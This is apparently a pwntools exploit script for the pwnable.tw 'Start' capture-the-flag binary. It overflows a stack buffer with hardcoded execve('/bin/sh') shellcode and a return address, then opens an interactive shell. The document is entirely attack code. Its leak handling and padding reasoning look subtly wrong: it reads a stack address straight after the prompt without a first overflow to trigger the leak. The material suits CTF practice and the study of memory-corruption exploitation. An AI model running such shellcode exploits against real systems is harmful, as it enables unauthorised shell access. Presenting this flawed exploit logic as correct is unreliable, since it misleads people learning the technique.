
from pwn import *

# Set up the target binary
binary_path = "./samples/PwnableTW/Start/start"
elf = ELF(binary_path)

# Start the process
p = process(binary_path)

# Receive the leaked stack address
# The sys_write at 0x804808f prints 20 bytes from esp.
# This esp points to the buffer where sys_read will write.
# The leaked address is the address of the buffer itself.
p.recvuntil(b"Start :")
leaked_stack_address = u32(p.recv(4))
log.info(f"Leaked stack address: {hex(leaked_stack_address)}")

# Craft shellcode for execve("/bin/sh", NULL, NULL)
# This is a standard 32-bit execve shellcode
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# Calculate padding
# The buffer is 20 bytes. Shellcode is 19 bytes. So 1 byte padding to fill the buffer.
# After the 20-byte buffer, there's a 4-byte value (initial_esp_value).
# The return address is after this 4-byte value.
# So, total padding before the return address is (20 - len(shellcode)) + 4 = 1 + 4 = 5 bytes.
padding_size = (20 - len(shellcode)) + 4

# Construct the payload
# Shellcode + padding + return address (leaked_stack_address)
payload = shellcode + b"A" * padding_size + p32(leaked_stack_address)

log.info(f"Payload length: {len(payload)}")

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
